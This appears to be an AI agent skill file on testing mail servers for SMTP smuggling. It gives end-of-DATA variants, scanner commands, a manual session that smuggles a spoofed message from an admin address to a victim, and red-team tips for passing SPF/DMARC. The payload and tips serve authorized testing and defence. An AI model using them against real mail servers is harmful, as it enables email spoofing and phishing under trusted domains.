---
name: smtp-smuggling
description: How to test for and understand SMTP smuggling vulnerabilities. Use this skill when investigating email security, testing SMTP servers for protocol parsing discrepancies, or when you need to understand how attackers can smuggle additional emails through SMTP protocol ambiguities. Make sure to use this skill whenever the user mentions SMTP security, email spoofing, protocol parsing vulnerabilities, mail server testing, or wants to test mail servers for smuggling attacks.
---

# SMTP Smuggling Testing

A skill for understanding and testing SMTP smuggling vulnerabilities in email infrastructure.

## What is SMTP Smuggling?

SMTP smuggling exploits discrepancies in how SMTP servers interpret the end-of-data sequence in email messages. An attacker can craft a message that the **outbound server** sees as one email, but the **inbound server** interprets as multiple emails. This allows:

- Smuggling additional emails inside legitimate ones
- Bypassing SPF/DMARC checks (the sender domain remains valid)
- Impersonating other users from the same domain

## When to Use This Skill

Use this skill when:
- Testing mail servers for SMTP protocol vulnerabilities
- Investigating email spoofing incidents
- Assessing email security posture
- Understanding how SMTP parsing discrepancies can be exploited
- Red teaming email infrastructure

## Prerequisites

Before testing, ensure you have:
- Authorization to test the target SMTP servers
- Access to an outbound SMTP server (with valid credentials if needed)
- Knowledge of the target's receiving SMTP server
- Tools: `openssl`, Python, or specialized SMTP smuggling scanners

## Core Concepts

### The Vulnerability Mechanism

1. **Outbound Server (A)**: Forwards a non-standard end-of-DATA sequence unchanged
2. **Inbound Server (B)**: Interprets that sequence as end-of-DATA and parses what follows as new SMTP commands
3. **The Gap**: Different servers accept different terminators as valid end-of-data markers

### Common End-of-DATA Variants to Test

| Sequence | Description |
|----------|-------------|
| `\n.\n` | LF-dot-LF |
| `\n.\r\n` | LF-dot-CRLF |
| `\r.\r\n` | CR-dot-CRLF |
| `\r\n.\r` | CRLF-dot-CR (bare CR at end) |

### Protocol Considerations

- **DATA vs BDAT**: Smuggling only works with `DATA` command. If the server uses `BDAT` (CHUNKING), the body is length-framed and prevents ambiguity.
- **PIPELINING**: Not required but helps hide injected commands in a single TCP write
- **STARTTLS**: Often needed for authenticated relays

## Testing Methodology

### Step 1: Enumerate SMTP Extensions

Check what extensions the target server supports:

```bash
openssl s_client -starttls smtp -connect smtp.target.com:587 -crlf
EHLO test.example.com
```

Look for:
- `PIPELINING` - helps with command injection
- `CHUNKING` or `BDAT` - if present, smuggling is harder
- Server banner and version

### Step 2: Test End-of-DATA Acceptance

Use the provided scanner script to test which sequences the server accepts:

```bash
python3 scripts/smtp_smuggling_scanner.py \
  --server smtp.target.com \
  --port 587 \
  --test-sequences "n.n,n.rn,r.rn,rn.r"
```

### Step 3: Manual Testing (Interactive)

For detailed analysis, use an interactive session:

```bash
openssl s_client -starttls smtp -crlf -connect smtp.target.com:587
```

Then send a test message with a non-standard terminator:

```
EHLO test.example.com
MAIL FROM:<test@example.com>
RCPT TO:<victim@target.com>
DATA
From: Test <test@example.com>
To: victim <victim@target.com>
Subject: Test

Test message
\n.\r\nMAIL FROM:<admin@target.com>
RCPT TO:<victim@target.com>
DATA
From: Admin <admin@target.com>
To: victim <victim@target.com>
Subject: Smuggled

Smuggled content
\r\n.\r\n
```

If the server accepts `\n.\r\n` as end-of-data, the second email may be delivered.

### Step 4: Verify Delivery

Check if the smuggled message was delivered:
- Monitor the target mailbox
- Check mail server logs
- Use a test account you control

## Using the Scanner Scripts

### Basic Scanner

```bash
python3 scripts/smtp_smuggling_scanner.py \
  --server mail.target.com \
  --port 25 \
  --recipient victim@target.com
```

### Outbound Relay Testing

Test through a specific outbound server:

```bash
python3 scripts/smtp_smuggling_scanner.py \
  --server mail.target.com \
  --port 25 \
  --recipient victim@target.com \
  --outbound-server smtp.relay.com \
  --outbound-port 587 \
  --starttls \
  --username user@relay.com \
  --password 'your-password'
```

### Available Scripts

| Script | Purpose |
|--------|--------|
| `smtp_smuggling_scanner.py` | Test inbound/outbound servers for smuggling |
| `test_eom_sequences.py` | Test specific end-of-data sequences |

## Known Vulnerable Software

### Postfix
- **Vulnerable**: Prior to 3.9 (default tolerated bare LFs)
- **Mitigation**: Enable `smtpd_forbid_bare_newline = normalize` or `reject`
- **Fixed versions**: 3.5.23, 3.6.13, 3.7.9, 3.8.4+

### Exim
- **Vulnerable**: 4.97/4.96 (depending on PIPELINING/CHUNKING)
- **Fixed**: 4.97.1+

### Sendmail
- **Vulnerable**: 8.17.x
- **Fixed**: 8.18+

### Other
- `aiosmtpd` before 1.4.5
- Various vendor gateways and SaaS relays

## Red Team Tips

1. **Use commodity senders**: Large providers (Exchange Online, shared hosts) often have valid SPF and may forward non-standard sequences
2. **Check CHUNKING support**: If missing, BDAT-first senders fall back to DATA, enabling smuggling
3. **Monitor headers**: Smuggled messages create separate `Received` chains starting at the inbound server
4. **DMARC alignment**: Often passes because MAIL FROM aligns with the outbound server's IP space

## Safety and Ethics

⚠️ **Important**: Only test SMTP smuggling on systems you own or have explicit authorization to test. Unauthorized testing may:
- Violate computer crime laws
- Trigger security incidents
- Damage relationships with service providers

## References

- [Original Research](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/)
- [Postfix SMTP Smuggling](https://www.postfix.org/smtp-smuggling.html)
- [hannob/smtpsmug](https://github.com/hannob/smtpsmug)
- [The-Login/SMTP-Smuggling-Tools](https://github.com/The-Login/SMTP-Smuggling-Tools)

## Troubleshooting

### Connection Issues
- Ensure STARTTLS is supported if using port 587
- Check firewall rules for SMTP traffic
- Verify credentials for authenticated relays

### No Smuggling Detected
- The server may enforce strict RFC compliance
- Try different end-of-data sequences
- Test through different outbound servers
- Check if CHUNKING is being used

### False Positives
- Verify actual message delivery, not just acceptance
- Check mail logs for rejected messages
- Confirm the second message has a separate envelope
